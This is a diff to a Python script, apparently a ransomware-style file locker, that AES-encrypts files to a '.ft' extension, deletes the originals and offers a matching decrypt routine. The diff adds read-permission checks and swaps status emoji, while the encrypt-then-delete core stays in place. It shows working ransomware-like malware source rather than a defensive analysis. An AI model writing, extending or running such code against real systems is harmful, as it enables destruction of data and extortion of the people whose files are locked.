@@ -61,16 +61,19 @@ def encrypt(files):
 	return initialization_vector + cipher.encrypt(files)
 
 def encrypt_files(file_name):
-	with open(file_name, 'rb') as open_f:
-		text = open_f.read()
-	open_f.close()
-	encryption = encrypt(text)
-	with open(file_name + '.ft', 'wb') as open_f:
-		open_f.write(encryption)
-	open_f.close()
-	os.remove(file_name)
-	if args.silent is False:
-		print('[+] ' + file_name + ' encrypted.')
+	if	os.access(file_name, os.R_OK):
+		with open(file_name, 'rb') as open_f:
+			text = open_f.read()
+		open_f.close()
+		encryption = encrypt(text)
+		with open(file_name + '.ft', 'wb') as open_f:
+			open_f.write(encryption)
+		open_f.close()
+		os.remove(file_name)
+		if args.silent is False:
+			print('[🥵] ' + file_name + ' encrypted.')
+	else:
+		print('[x] ' + file_name + ' permission denied.')
 
 def decrypt(ciphered):
 	initialization_vector = ciphered[:AES.block_size]
@@ -79,17 +82,19 @@ def decrypt(ciphered):
 	return text.rstrip(b"\0")
 
 def decrypt_files(file_name):
-	with open(file_name, 'rb') as open_f:
-		text = open_f.read()
-	open_f.close()
-	decryption = decrypt(text)
-	with open(file_name[:-3], 'wb') as open_f:
-		open_f.write(decryption)
-	open_f.close()
-	os.remove(file_name)
-	if args.silent is False:
-		print('[+] ' + file_name + ' decrypted.')
-
+	if os.access(file_name, os.R_OK):
+		with open(file_name, 'rb') as open_f:
+			text = open_f.read()
+		open_f.close()
+		decryption = decrypt(text)
+		with open(file_name[:-3], 'wb') as open_f:
+			open_f.write(decryption)
+		open_f.close()
+		os.remove(file_name)
+		if args.silent is False:
+			print('[🥶] ' + file_name + ' decrypted.')
+	else:
+		print('[x] ' + file_name + ' permission denied.')
 
 if __name__ == '__main__':
 	args = parse_args()
